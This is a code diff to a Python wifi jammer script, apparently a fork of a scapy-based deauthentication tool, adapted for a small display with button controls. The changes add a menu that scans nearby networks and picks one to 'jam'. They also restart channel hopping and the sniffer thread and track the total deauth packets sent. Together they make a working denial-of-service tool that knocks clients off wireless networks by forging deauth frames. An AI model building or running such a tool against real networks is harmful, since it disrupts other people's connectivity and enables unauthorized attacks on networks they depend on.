@@ -96,36 +96,27 @@ def get_mon_iface(args):
     global monitor_on
     monitors, interfaces = iwconfig()
     if args.interface:
-        monitor_on = True
-        monmode = start_mon_mode(args.interface)   
-        return monmode
+        monitor_on = True  
+        
+        choosen_network = get_network_from_interface_with_gui(monmode)
+        
+        return monmode, choosen_network
     if len(monitors) > 0:
         monitor_on = True
-        return monitors[0]
+        
+        choosen_network = get_network_from_interface_with_gui(monitors[0])
+        
+        return monitors[0], choosen_network
     else:
         # Start monitor mode on a wireless interface
         print('['+G+'*'+W+'] Finding the most powerful interface...')
                
         interface = get_iface(interfaces)
         
-            
-        btn.draw_text_screen(["Interface selected:", interface])
-        sleep(2)
+        choosen_network = get_network_from_interface_with_gui(interface)
         
-        btn.draw_text_screen(["Scan wifi on interface", interface, "", "please wait"])
-            
-        networkList = get_network_from_interface(interface)
-        
-        toDisplay = []
-        
-        for network in networkList:
-            toDisplay.append(network[1])
-        choosen_interface = btn.draw_text_screen_selector(toDisplay)
-        
-        print(networkList)
         monmode = start_mon_mode(interface)   
-        print(monmode)
-        return monmode
+        return monmode, choosen_network
 
 def iwconfig():
     monitors = []
@@ -183,17 +174,44 @@ def get_iface(interfaces):
             return interface
 
 
+def get_network_from_interface_with_gui(iface):
+    for i in range(3, -1, -1):      
+        sleep(1)
+        btn.draw_text_screen(["Interface selected:", iface, "", str(i)+"s"])
+    
+    btn.draw_text_screen(["Scan wifi interface", iface, "", "      please wait"])
+        
+    networkList = get_network_from_interface(iface)
+    
+    toDisplay = []
+    
+    for network in networkList:
+        toDisplay.append(networkList[network])
+    choosen_network_selector = btn.draw_text_screen_selector(toDisplay)
+    
+    choosen_network = []
+    i = 0
+    for network in networkList:
+        if i == choosen_network_selector[0]:
+            choosen_network = (network,networkList[network])
+            break
+        i = i + 1 
+    
+    print("----------------------")
+    print(choosen_network)
+    print("----------------------")
+    return choosen_network
+
 def get_network_from_interface(iface):
-    networks = []
+    networks = {}
     proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
-    to_add = []
+    address_to_add = ""
     for line in proc.communicate()[0].decode('utf-8').split('\n'):
         if ' - Address:' in line: # first line in iwlist scan for a new AP
-            to_add.append(line.split(" - Address: ")[1])
+            address_to_add = line.split(" - Address: ")[1]
         elif 'ESSID:' in line: # first line in iwlist scan for a new AP
-            to_add.append(line.split("ESSID:")[1].replace('"', ''))
-            networks.append(to_add)
-            to_add = []
+            ssid = line.split("ESSID:")[1].replace('"', '')
+            networks[address_to_add] = ssid
     return networks
 
 
@@ -279,6 +297,8 @@ def deauth(monchannel):
     multi-APs to one gateway. Constantly scans the clients_APs list and
     starts a thread to deauth each instance
     '''
+    
+    global totalPackets
 
     pkts = []
 
@@ -316,6 +336,8 @@ def deauth(monchannel):
 
         for p in pkts:
             send(p, inter=float(args.timeinterval), count=int(args.packets))
+        totalPackets = totalPackets + len(pkts)
+        btn.draw_text_screen(["Sending deauth packet", str(len(pkts)) + " new packets sent","", "total of packets: " + str(totalPackets)])
 
 def output(err, monchannel):
     os.system('clear')
@@ -470,6 +492,10 @@ def AP_check(addr1, addr2):
                 return clients_APs.append([addr1, addr2, ap[1], ap[2]])
 
 def stop(signal, frame):
+      
+    btn.draw_text_screen(["Quitting Wifi jammer", " ", "      Goodbye",""])
+    sleep(2)
+    btn.clear_screen()
     if monitor_on:
         sys.exit('\n['+R+'!'+W+'] Closing')
     else:
@@ -482,6 +508,10 @@ def sniff_function(mon_iface):
 
 
 if __name__ == "__main__":
+
+    monitor_on = None  
+    totalPackets = 0
+    signal(SIGINT, stop)
 
     btn = Selector_screen_btn(20, 8, 7)      
 
@@ -499,49 +529,33 @@ if __name__ == "__main__":
     DN = open(os.devnull, 'w')
     lock = Lock()
     args = parse_args()
-    monitor_on = None    
+    
+
+    
     btn.draw_text_screen(["Scan wifi interfaces...", "", "     please wait",""])
-    mon_iface = get_mon_iface(args)
+    mon_iface, choosen_network= get_mon_iface(args)
     
-    remove_mon_iface(mon_iface)
-        
-    sniffThread = Thread(target=sniff_function, args=(mon_iface,))
-    sniffThread.daemon = True
-    sniffThread.start()
-    
-    
-    for i in range(10, -1, -1):      
+    for i in range(3, -1, -1):      
         sleep(1)
-        btn.draw_text_screen(["Getting wifi packet", "during 10s"," ", str(i)+"s"])
-    print(APs)
-    print(type(APs))
-    APsList = []
-    for AP in APs:
-        APsList.append(AP[2].decode('utf-8'))
-    btn.draw_text_screen(["You'll be asked", "to select the wifi","that will be jammed"])
-    sleep(3)
-    selectedAP = btn.draw_text_screen_selector(APsList)
-    print(selectedAP)
-    print(APs[selectedAP[0]])
-    
-    print(args.accesspoint)
-    args.accesspoint = APs[selectedAP[0]][0]
-    
-    print(args.accesspoint)
-    
+        btn.draw_text_screen(["You will jam:", choosen_network[1],choosen_network[0], str(i)+"s"])
+    btn.draw_text_screen(["Deauth will start soon", choosen_network[1],"", "    please wait"])
+    args.accesspoint = choosen_network[0]
+
     conf.iface = mon_iface
     mon_MAC = mon_mac(mon_iface)
     
     first_pass = 1   
-
-    signal(SIGINT, stop)
-
+ 
     try:
+        sniffThread = Thread(target=sniff_function, args=(mon_iface,))
+        sniffThread.daemon = True
+        sniffThread.start()
         # Start channel hopping
-        sleep(1)
-       #channel_hop(mon_iface, args)
-    except Exception as msg:
-        print(msg)
+        channel_hop(mon_iface, args)
+    except Exception as msg:        
+        btn.draw_text_screen(["Quitting Wifi jammer", " ", "      Goodbye",""])
+        sleep(2)        
+        btn.clear_screen()
         remove_mon_iface(mon_iface)
         os.system('service network-manager restart')
         print('\n['+R+'!'+W+'] Closing')
